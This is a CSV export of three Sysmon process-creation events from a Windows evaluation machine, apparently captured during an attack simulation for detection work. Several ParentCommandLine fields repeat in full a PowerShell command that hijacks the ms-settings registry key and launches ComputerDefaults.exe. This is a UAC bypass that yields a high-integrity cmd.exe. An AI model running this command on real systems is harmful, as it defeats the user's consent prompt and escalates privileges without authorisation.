Microsoft-Windows-Sysmon/Operational,"""C:\Windows\System32\ComputerDefaults.exe"" ",Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Set Program Access and Computer Defaults Control Panel,,,,,,,1,9512,,10.0.22621.1 (WinBuild.160101.0800),"MD5=175A95425DE8269C867B6C2C46A9785C,SHA256=62F175FB6C679AB74D4E8743DE5DE014AB2181E4EBDF0008EC4B6C2C5F22E729,IMPHASH=F80FC6EF610CC28E0F47123BDB00C150",C:\Windows\System32\ComputerDefaults.exe,,High,0x8000000000000000,Information,{fda94052-3502-658d-7367-080000000000},0x86773,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:50.998

ProcessGuid: {fda94052-3b22-658d-9902-000000000b00}

ProcessId: 6884

Image: C:\Windows\System32\ComputerDefaults.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Set Program Access and Computer Defaults Control Panel

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: ComputerDefaults.EXE

CommandLine: ""C:\Windows\System32\ComputerDefaults.exe"" 

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-7367-080000000000}

LogonId: 0x86773

TerminalSessionId: 1

IntegrityLevel: High

Hashes: MD5=175A95425DE8269C867B6C2C46A9785C,SHA256=62F175FB6C679AB74D4E8743DE5DE014AB2181E4EBDF0008EC4B6C2C5F22E729,IMPHASH=F80FC6EF610CC28E0F47123BDB00C150

ParentProcessGuid: {fda94052-3b21-658d-9502-000000000b00}

ParentProcessId: 3944

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {New-Item \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Force
New-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""DelegateExecute\"""" -Value \""""\"""" -Force
Set-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""(default)\"""" -Value \""""C:\Windows\System32\cmd.exe\"""" -Force
Start-Process \""""C:\Windows\System32\ComputerDefaults.exe\""""}

ParentUser: WINDEV2309EVAL\User",Info,ComputerDefaults.EXE,"""powershell.exe"" & {New-Item \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Force
New-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""DelegateExecute\"""" -Value \""""\"""" -Force
Set-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""(default)\"""" -Value \""""C:\Windows\System32\cmd.exe\"""" -Force
Start-Process \""""C:\Windows\System32\ComputerDefaults.exe\""""}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-3b21-658d-9502-000000000b00},3944,WINDEV2309EVAL\User,{fda94052-3b22-658d-9902-000000000b00},7044,6884,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:08:50.9990078Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:08:50.998,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:50.9990078Z""/>
      <EventRecordID>9512</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:50.998</Data>
      <Data Name=""ProcessGuid"">{fda94052-3b22-658d-9902-000000000b00}</Data>
      <Data Name=""ProcessId"">6884</Data>
      <Data Name=""Image"">C:\Windows\System32\ComputerDefaults.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Set Program Access and Computer Defaults Control Panel</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">ComputerDefaults.EXE</Data>
      <Data Name=""CommandLine"">""C:\Windows\System32\ComputerDefaults.exe"" </Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-7367-080000000000}</Data>
      <Data Name=""LogonId"">0x86773</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">High</Data>
      <Data Name=""Hashes"">MD5=175A95425DE8269C867B6C2C46A9785C,SHA256=62F175FB6C679AB74D4E8743DE5DE014AB2181E4EBDF0008EC4B6C2C5F22E729,IMPHASH=F80FC6EF610CC28E0F47123BDB00C150</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-3b21-658d-9502-000000000b00}</Data>
      <Data Name=""ParentProcessId"">3944</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {New-Item \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Force
New-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""DelegateExecute\"""" -Value \""""\"""" -Force
Set-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""(default)\"""" -Value \""""C:\Windows\System32\cmd.exe\"""" -Force
Start-Process \""""C:\Windows\System32\ComputerDefaults.exe\""""}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:50.998

ProcessGuid: {fda94052-3b22-658d-9902-000000000b00}

ProcessId: 6884

Image: C:\Windows\System32\ComputerDefaults.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Set Program Access and Computer Defaults Control Panel

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: ComputerDefaults.EXE

CommandLine: ""C:\Windows\System32\ComputerDefaults.exe"" 

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-7367-080000000000}

LogonId: 0x86773

TerminalSessionId: 1

IntegrityLevel: High

Hashes: MD5=175A95425DE8269C867B6C2C46A9785C,SHA256=62F175FB6C679AB74D4E8743DE5DE014AB2181E4EBDF0008EC4B6C2C5F22E729,IMPHASH=F80FC6EF610CC28E0F47123BDB00C150

ParentProcessGuid: {fda94052-3b21-658d-9502-000000000b00}

ParentProcessId: 3944

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {New-Item \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Force
New-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""DelegateExecute\"""" -Value \""""\"""" -Force
Set-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""(default)\"""" -Value \""""C:\Windows\System32\cmd.exe\"""" -Force
Start-Process \""""C:\Windows\System32\ComputerDefaults.exe\""""}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,consent.exe 7068 366 000002495109D9A0,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Consent UI for administrative applications,,,,,,,1,9511,,10.0.22621.2070 (WinBuild.160101.0800),"MD5=04236290F783C1B3A4D8B417BF6244A0,SHA256=DEDEC4ACEC0895F5A7622ADCB29C359F8855723653FE906C279565A01B7F2AC6,IMPHASH=5D0C875DBD930A73D5A983016E384930",C:\Windows\System32\consent.exe,,System,0x8000000000000000,Information,{fda94052-34eb-658d-e703-000000000000},0x3e7,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:50.931

ProcessGuid: {fda94052-3b22-658d-9802-000000000b00}

ProcessId: 1840

Image: C:\Windows\System32\consent.exe

FileVersion: 10.0.22621.2070 (WinBuild.160101.0800)

Description: Consent UI for administrative applications

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: consent.exe

CommandLine: consent.exe 7068 366 000002495109D9A0

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 1

IntegrityLevel: System

Hashes: MD5=04236290F783C1B3A4D8B417BF6244A0,SHA256=DEDEC4ACEC0895F5A7622ADCB29C359F8855723653FE906C279565A01B7F2AC6,IMPHASH=5D0C875DBD930A73D5A983016E384930

ParentProcessGuid: {fda94052-b676-658c-ae00-000000000b00}

ParentProcessId: 7068

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo

ParentUser: NT AUTHORITY\SYSTEM",Info,consent.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo,C:\Windows\System32\svchost.exe,{fda94052-b676-658c-ae00-000000000b00},7068,NT AUTHORITY\SYSTEM,{fda94052-3b22-658d-9802-000000000b00},7044,1840,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:08:50.9329612Z,,,Process Create (rule: ProcessCreate),1,6672,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-28 09:08:50.931,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:50.9329612Z""/>
      <EventRecordID>9511</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:50.931</Data>
      <Data Name=""ProcessGuid"">{fda94052-3b22-658d-9802-000000000b00}</Data>
      <Data Name=""ProcessId"">1840</Data>
      <Data Name=""Image"">C:\Windows\System32\consent.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2070 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Consent UI for administrative applications</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">consent.exe</Data>
      <Data Name=""CommandLine"">consent.exe 7068 366 000002495109D9A0</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{fda94052-34eb-658d-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=04236290F783C1B3A4D8B417BF6244A0,SHA256=DEDEC4ACEC0895F5A7622ADCB29C359F8855723653FE906C279565A01B7F2AC6,IMPHASH=5D0C875DBD930A73D5A983016E384930</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b676-658c-ae00-000000000b00}</Data>
      <Data Name=""ParentProcessId"">7068</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:50.931

ProcessGuid: {fda94052-3b22-658d-9802-000000000b00}

ProcessId: 1840

Image: C:\Windows\System32\consent.exe

FileVersion: 10.0.22621.2070 (WinBuild.160101.0800)

Description: Consent UI for administrative applications

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: consent.exe

CommandLine: consent.exe 7068 366 000002495109D9A0

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 1

IntegrityLevel: System

Hashes: MD5=04236290F783C1B3A4D8B417BF6244A0,SHA256=DEDEC4ACEC0895F5A7622ADCB29C359F8855723653FE906C279565A01B7F2AC6,IMPHASH=5D0C875DBD930A73D5A983016E384930

ParentProcessGuid: {fda94052-b676-658c-ae00-000000000b00}

ParentProcessId: 7068

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\System32\ComputerDefaults.exe"" ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Set Program Access and Computer Defaults Control Panel,,,,,,,1,9510,,10.0.22621.1 (WinBuild.160101.0800),"MD5=175A95425DE8269C867B6C2C46A9785C,SHA256=62F175FB6C679AB74D4E8743DE5DE014AB2181E4EBDF0008EC4B6C2C5F22E729,IMPHASH=F80FC6EF610CC28E0F47123BDB00C150",C:\Windows\System32\ComputerDefaults.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:50.914

ProcessGuid: {fda94052-3b22-658d-9702-000000000b00}

ProcessId: 7972

Image: C:\Windows\System32\ComputerDefaults.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Set Program Access and Computer Defaults Control Panel

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: ComputerDefaults.EXE

CommandLine: ""C:\Windows\System32\ComputerDefaults.exe"" 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=175A95425DE8269C867B6C2C46A9785C,SHA256=62F175FB6C679AB74D4E8743DE5DE014AB2181E4EBDF0008EC4B6C2C5F22E729,IMPHASH=F80FC6EF610CC28E0F47123BDB00C150

ParentProcessGuid: {fda94052-3b21-658d-9502-000000000b00}

ParentProcessId: 3944

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {New-Item \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Force
New-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""DelegateExecute\"""" -Value \""""\"""" -Force
Set-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""(default)\"""" -Value \""""C:\Windows\System32\cmd.exe\"""" -Force
Start-Process \""""C:\Windows\System32\ComputerDefaults.exe\""""}

ParentUser: WINDEV2309EVAL\User",Info,ComputerDefaults.EXE,"""powershell.exe"" & {New-Item \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Force
New-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""DelegateExecute\"""" -Value \""""\"""" -Force
Set-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""(default)\"""" -Value \""""C:\Windows\System32\cmd.exe\"""" -Force
Start-Process \""""C:\Windows\System32\ComputerDefaults.exe\""""}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-3b21-658d-9502-000000000b00},3944,WINDEV2309EVAL\User,{fda94052-3b22-658d-9702-000000000b00},7044,7972,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:08:50.9179927Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:08:50.914,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:50.9179927Z""/>
      <EventRecordID>9510</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:50.914</Data>
      <Data Name=""ProcessGuid"">{fda94052-3b22-658d-9702-000000000b00}</Data>
      <Data Name=""ProcessId"">7972</Data>
      <Data Name=""Image"">C:\Windows\System32\ComputerDefaults.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Set Program Access and Computer Defaults Control Panel</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">ComputerDefaults.EXE</Data>
      <Data Name=""CommandLine"">""C:\Windows\System32\ComputerDefaults.exe"" </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=175A95425DE8269C867B6C2C46A9785C,SHA256=62F175FB6C679AB74D4E8743DE5DE014AB2181E4EBDF0008EC4B6C2C5F22E729,IMPHASH=F80FC6EF610CC28E0F47123BDB00C150</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-3b21-658d-9502-000000000b00}</Data>
      <Data Name=""ParentProcessId"">3944</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {New-Item \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Force
New-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""DelegateExecute\"""" -Value \""""\"""" -Force
Set-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""(default)\"""" -Value \""""C:\Windows\System32\cmd.exe\"""" -Force
Start-Process \""""C:\Windows\System32\ComputerDefaults.exe\""""}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:50.914

ProcessGuid: {fda94052-3b22-658d-9702-000000000b00}

ProcessId: 7972

Image: C:\Windows\System32\ComputerDefaults.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Set Program Access and Computer Defaults Control Panel

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: ComputerDefaults.EXE

CommandLine: ""C:\Windows\System32\ComputerDefaults.exe"" 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=175A95425DE8269C867B6C2C46A9785C,SHA256=62F175FB6C679AB74D4E8743DE5DE014AB2181E4EBDF0008EC4B6C2C5F22E729,IMPHASH=F80FC6EF610CC28E0F47123BDB00C150

ParentProcessGuid: {fda94052-3b21-658d-9502-000000000b00}

ParentProcessId: 3944

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {New-Item \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Force
New-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""DelegateExecute\"""" -Value \""""\"""" -Force
Set-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""(default)\"""" -Value \""""C:\Windows\System32\cmd.exe\"""" -Force
Start-Process \""""C:\Windows\System32\ComputerDefaults.exe\""""}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
